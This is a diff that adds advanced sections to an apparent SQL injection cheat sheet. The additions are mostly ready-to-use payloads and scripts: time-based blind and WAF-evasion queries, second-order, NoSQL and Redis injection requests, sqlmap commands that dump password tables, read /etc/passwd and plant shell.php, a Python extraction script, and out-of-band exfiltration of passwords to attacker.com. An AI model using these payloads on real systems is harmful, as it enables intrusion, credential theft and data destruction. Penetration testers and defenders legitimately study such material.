@@ -301,3 +301,285 @@ sqlmap -u "URL?id=1" --tamper=charencode --batch
 sqlmap -u "URL?id=1" --os-shell
 sqlmap -u "URL?id=1" --os-shell --web-root=/var/www/html
 ```
+
+---
+
+## 11. Advanced Time-Based Blind (Multi-DBMS)
+
+### MySQL Heavy Queries (when SLEEP is blocked)
+
+```sql
+' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)>0 AND '1'='1
+' AND IF(SUBSTRING(database(),1,1)='s',(SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B),0)-- -
+```
+
+### PostgreSQL Time-Based
+
+```sql
+'; SELECT CASE WHEN (SELECT current_user)='postgres' THEN pg_sleep(5) ELSE pg_sleep(0) END--
+' AND (SELECT CASE WHEN SUBSTRING(current_database(),1,1)='t' THEN pg_sleep(3) ELSE pg_sleep(0) END) IS NOT NULL--
+```
+
+### MSSQL Time-Based
+
+```sql
+'; IF (SELECT LEN(DB_NAME()))>5 WAITFOR DELAY '0:0:3'--
+'; IF (SELECT SUBSTRING(DB_NAME(),1,1))='m' WAITFOR DELAY '0:0:3'--
+' AND (SELECT CASE WHEN (SUBSTRING(@@version,1,1)='M') THEN 1 ELSE 1/(SELECT 0) END)=1--
+```
+
+### Oracle Time-Based
+
+```sql
+' AND (SELECT CASE WHEN SUBSTR(user,1,1)='S' THEN DBMS_PIPE.RECEIVE_MESSAGE('a',3) ELSE NULL END FROM dual) IS NOT NULL--
+' AND 1=(SELECT CASE WHEN (SELECT LENGTH(banner) FROM v$version WHERE ROWNUM=1)>10 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',3) ELSE 1 END FROM dual)--
+```
+
+---
+
+## 12. WAF Evasion Advanced Techniques
+
+### Double URL Encoding
+
+```sql
+%2527%2520UNION%2520SELECT%25201,2,3-- -
+%252f%252a*/UNION%252f%252a*/SELECT%252f%252a*/1,2,3-- -
+```
+
+### Unicode/UTF-8 Normalization Bypass
+
+```sql
+＇ UNION SELECT 1,2,3-- -          -- Fullwidth apostrophe
+' UNION SELECT 1,2,3%EF%BC%8D%EF%BC%8D -   -- Fullwidth dashes
+```
+
+### HTTP Parameter Pollution
+
+```bash
+# Split payload across duplicate parameters
+curl "http://target/page?id=1'/*&id=*/UNION/*&id=*/SELECT/*&id=*/1,2,3--+-"
+
+# JSON injection (when WAF only inspects URL params)
+curl -X POST http://target/api/search \
+  -H "Content-Type: application/json" \
+  -d '{"query": "test\" UNION SELECT 1,database(),3-- -"}'
+```
+
+### Chunked Transfer Encoding Bypass
+
+```bash
+# Some WAFs don't inspect chunked bodies
+printf 'POST /search HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n5\r\nid=1\'\r\n6\r\n UNION\r\n7\r\n SELECT\r\n5\r\n 1,2,\r\n1\r\n3\r\n3\r\n-- \r\n0\r\n\r\n' | nc target.com 80
+```
+
+### Comment Nesting and Obfuscation
+
+```sql
+' /*!50000UnIoN*/ /*!50000SeLeCt*/ 1,/*!50000dAtAbAsE*/(),3-- -
+' UN/**/ION SE/**/LECT 1,2,3-- -
+' %55nion %53elect 1,2,3-- -
+' UNION ALL%0a%0dSELECT%0a%0d1,2,3-- -
+```
+
+---
+
+## 13. Second-Order SQL Injection
+
+### Registration-Based Second Order
+
+```bash
+# Step 1: Register with malicious username
+curl -X POST http://target/register \
+  -d "username=admin'-- -&password=test123&email=test@test.com"
+
+# Step 2: Trigger the injection via password reset or profile view
+curl http://target/profile \
+  -H "Cookie: session=<session_after_login>"
+# The stored username is used unsafely in a subsequent query
+```
+
+### Stored Payload in Database Fields
+
+```sql
+-- Insert payload into a field that will be used in another query later
+INSERT INTO comments (user_id, body) VALUES (1, 'test'||(SELECT password FROM users WHERE username='admin')||'')
+
+-- When admin views comments, the query uses the stored value unsafely:
+-- SELECT * FROM comments WHERE body LIKE '%<stored_value>%'
+```
+
+### File Upload Filename Injection
+
+```bash
+# Upload file with SQL injection in filename
+curl -X POST http://target/upload \
+  -F "file=@test.txt;filename=test' UNION SELECT password FROM users-- .txt"
+# If filename is stored and later used in a query without sanitization
+```
+
+---
+
+## 14. NoSQL Injection Crossover
+
+### MongoDB Injection
+
+```bash
+# Authentication bypass
+curl -X POST http://target/login \
+  -H "Content-Type: application/json" \
+  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
+
+# Data extraction via $regex
+curl -X POST http://target/login \
+  -H "Content-Type: application/json" \
+  -d '{"username": "admin", "password": {"$regex": "^a"}}'
+
+# Operator injection
+curl http://target/api/users?username[$ne]=invalid
+curl http://target/api/users?username[$regex]=admin.*
+```
+
+### MongoDB $where Injection
+
+```bash
+# JavaScript injection in $where clause
+curl "http://target/api/search?q=test' || this.password.match(/^admin/) || 'a'=='a"
+
+# Time-based extraction
+curl "http://target/api/search?q=test' || (this.password[0]=='a' && sleep(3000)) || 'a'=='b"
+```
+
+### Redis CRLF Injection
+
+```bash
+# If user input reaches Redis commands
+curl "http://target/api/cache?key=test%0d%0aSET%20hacked%20true%0d%0a"
+curl "http://target/api/cache?key=test%0d%0aCONFIG%20SET%20dir%20/var/www/html%0d%0a"
+```
+
+---
+
+## 15. ORM-Specific Injection Vectors
+
+### Hibernate HQL Injection
+
+```sql
+-- HQL uses entity names, not table names
+' AND 1=1 AND ''='
+' UNION SELECT u.password FROM User u WHERE u.username='admin' AND '1'='1
+```
+
+### Django ORM Injection (via extra/raw)
+
+```python
+# If user input reaches .extra() or .raw()
+# Vulnerable pattern: Model.objects.extra(where=[f"field = '{user_input}'"])
+# Payload:
+# user_input = "' OR '1'='1"
+
+# GIS function injection (Django + PostGIS)
+# Vulnerable: Model.objects.raw(f"SELECT * FROM table WHERE ST_Contains(geom, ST_GeomFromText('{user_input}'))")
+```
+
+### Sequelize Literal Injection
+
+```javascript
+// If Sequelize.literal() is used with user input
+// Vulnerable: where: { id: Sequelize.literal(`${userInput}`) }
+// Payload: "1; DROP TABLE users; --"
+
+// Operator injection
+// POST body: {"username": {"$like": "%admin%"}}
+```
+
+### ActiveRecord Injection (Ruby on Rails)
+
+```ruby
+# Vulnerable patterns:
+# User.where("name = '#{params[:name]}'")
+# User.order(params[:sort])
+
+# Payloads:
+# params[:name] = "' OR '1'='1"
+# params[:sort] = "(CASE WHEN (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%')=1 THEN name ELSE email END)"
+```
+
+---
+
+## 16. Automated Exploitation Scripts
+
+### sqlmap Advanced Usage
+
+```bash
+# Enumerate with specific techniques
+sqlmap -u "URL?id=1" --technique=T --time-sec=3 --batch  # Time-based only
+sqlmap -u "URL?id=1" --technique=B --batch               # Boolean-based only
+sqlmap -u "URL?id=1" --technique=E --batch               # Error-based only
+
+# Custom injection point
+sqlmap -u "URL" --data="id=1*&submit=true" --batch       # * marks injection point
+
+# POST JSON body
+sqlmap -u "URL" --data='{"id":"1*"}' --content-type="application/json" --batch
+
+# Through proxy with custom headers
+sqlmap -u "URL?id=1" --proxy="http://127.0.0.1:8080" \
+  --headers="X-Custom: value\nAuthorization: Bearer token" --batch
+
+# Dump specific data
+sqlmap -u "URL?id=1" -D dbname -T users -C username,password --dump --batch
+
+# OS command execution
+sqlmap -u "URL?id=1" --os-cmd="id" --batch
+sqlmap -u "URL?id=1" --file-read="/etc/passwd" --batch
+sqlmap -u "URL?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php" --batch
+```
+
+### Custom Boolean Blind Extraction Script
+
+```python
+import requests
+import string
+
+def extract_data(url, query, charset=string.printable):
+    """Extract data character by character via boolean blind SQLi"""
+    result = ""
+    for pos in range(1, 100):
+        found = False
+        for char in charset:
+            payload = f"' AND SUBSTRING(({query}),{pos},1)='{char}'-- -"
+            r = requests.get(url, params={"id": f"1{payload}"})
+            if "Welcome" in r.text:  # True condition indicator
+                result += char
+                found = True
+                print(f"\r[+] Extracting: {result}", end="", flush=True)
+                break
+        if not found:
+            break
+    print()
+    return result
+
+# Usage
+db_name = extract_data(
+    "http://target/page",
+    "SELECT database()"
+)
+tables = extract_data(
+    "http://target/page",
+    "SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()"
+)
+```
+
+### DNS Exfiltration (Out-of-Band)
+
+```sql
+-- MySQL (requires LOAD_FILE privilege)
+' AND LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\share'))-- -
+' AND LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\a'))-- -
+
+-- MSSQL (xp_dirtree)
+'; DECLARE @d VARCHAR(1024); SET @d=(SELECT TOP 1 password FROM users); EXEC('master..xp_dirtree "\\'+@d+'.attacker.com\a"')--
+
+-- Oracle (UTL_HTTP)
+' AND 1=UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))--
+```
